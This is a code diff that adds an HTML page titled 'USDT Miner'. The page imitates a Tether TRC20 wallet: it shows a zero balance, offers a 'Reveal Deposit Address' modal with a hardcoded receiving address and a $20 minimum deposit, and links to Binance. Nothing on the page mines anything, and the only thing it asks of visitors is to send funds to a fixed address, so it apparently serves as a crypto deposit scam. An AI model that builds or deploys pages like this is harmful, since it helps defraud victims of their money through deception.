@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&family=Quicksand:wght@500&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <title>USDT Miner</title>
+    <style>
+        * {
+            margin: 0 auto;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            font-family: 'Quicksand', sans-serif;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .head {
+            text-align: center;
+        }
+        #logo {
+            width: 40px;
+            margin: 20px;
+        }
+        .action b {
+            font-size: 24px;
+        }
+        .action h3 {
+            text-align: center;
+        }
+        .action hr {
+            margin: 20px;
+        }
+        .history img {
+            width: 100px;
+            margin: 20px;
+        }
+        a {
+            color: #49b5ab;
+            outline: none;
+            text-decoration: none;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgb(0, 0, 0);
+            background-color: rgba(0, 0, 0, 0.4);
+            padding-top: 60px;
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 90%;
+            border-radius: 10px;
+        }
+        .minfo h3 {
+            text-align: center;
+        }
+        .minfo p {
+            background-color: #e8e8e8;
+            color: red;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 10px;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .dp {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            width: 80%;
+        }
+        .dp button {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 10px;
+            border-style: dotted;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            color: #49b5ab;
+        }
+        .dp button:hover {
+            background-color: #49b5ab;
+            color: #fff;
+            transition: background-color 0.3s ease;
+        }
+        .dpp button {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 10px;
+            border-style: dotted;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            color: #49b5ab;
+        }
+        .dpp button:hover {
+            background-color: #49b5ab;
+            color: #fff;
+            transition: background-color 0.3s ease;
+        }
+        #addressSpan {
+            font-size: 12px;
+        }
+        #tsc {
+            color: #49b5ab;
+            font-weight: normal;
+        }
+        .fa-copy {
+            float: right;
+        }
+        .add {
+            background-color: #e8e8e8;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 10px;
+        }
+        .add h3 {
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="head">
+            <h3>Tether</h3>
+            <p>USDT  |  Trc20</p>
+        </div>
+        <div class="action">
+            <center>
+                <img id="logo" src="https://coinhere.io/wp-content/uploads/2020/08/Tether-USDT-icon-1.png" alt="" srcset="">
+            </center>
+            <h3><b id="balance">0</b>USDT</h3>
+            <p style="text-align: center;"> ≈ $0.00</p>
+            <hr>
+        </div>
+        <div class="history">
+            <center>
+                <img src="https://assets.materialup.com/uploads/78ac6855-d4e4-4422-b66d-51efb34448fc/preview.gif" alt="" srcset="">
+                <p>Transactions will appear here.</p>
+                <p>Can't find any transaction? <b id="tsc" onclick="location.href ='https://tronscan.org/'">Check explorer</b></p>
+            </center>
+        </div>
+        <div class="dp">
+            <button onclick="openModal()">Reveal Deposit Address</button>
+        </div>
+        <div id="myModal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeModal()">×</span>
+                <div class="minfo">
+                    <h3>Receive</h3>
+                    <p>
+                        <!--<b style="margin-bottom: 5px;">Minimum Deposit is $20.00 <i class="fa-solid fa-triangle-exclamation"></i></b><br>-->
+                        Only send USDT (Trc20) assets to this address. Sending any other assets will be lost forever <i class="fa-solid fa-triangle-exclamation"></i>
+                    </p>
+                </div>
+                <div class="add">
+                    <h3 style="font-size: small;">Minimum Deposit <span style="float: right;">$20.00 (Trc20)</span></h3>
+                    <h3 id="addressSpan"> TVcDSnPU7fjUNqvvsnUhufSsA1ZvRjDRaY <i onclick="copyAddress()" class="fa-solid fa-copy"></i></h3>
+                    <div class="dpp">
+                        <button onclick="location.href ='https://accounts.binance.com'">From exchange [Binance]</button>
+                    </div>
+                </div>
+                <div class="minfo">
+                    <p>
+                        <!--<b style="margin-bottom: 5px;">Minimum Deposit is $20.00 <i class="fa-solid fa-triangle-exclamation"></i></b><br>-->
+                        USDT (Trc20) Deposited are for Transaction Purposes only <i class="fa-solid fa-triangle-exclamation"></i>
+                    </p>
+                </div>
+            </div>
+        </div>
+        <script>
+            //const savedBalance = localStorage.getItem('minedBalance');
+            //if (savedBalance) {
+                //const balanceElement = document.getElementById('balance');
+                //balanceElement.innerText = savedBalance;
+            //}
+            function openModal() {
+                const modal = document.getElementById('myModal');
+                modal.style.display = 'block';
+            }
+            function closeModal() {
+                const modal = document.getElementById('myModal');
+                modal.style.display = 'none';
+            }
+            window.onclick = function (event) {
+                const modal = document.getElementById('myModal');
+                if (event.target === modal) {
+                    modal.style.display = 'none';
+                }
+            };
+        </script>
+        <script>
+            function copyAddress() {
+                var addressText = document.getElementById('addressSpan').innerText;
+                var textarea = document.createElement('textarea');
+                textarea.value = addressText;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Copied!',
+                    text: 'Address copied to clipboard: ' + addressText,
+                    showConfirmButton: false,
+                    timer: 1500,
+                    iconColor: '#49b5ab',
+                    confirmButtonColor: '#49b5ab'
+                });
+            }
+        </script>
+    </div>
+</body>
+</html>
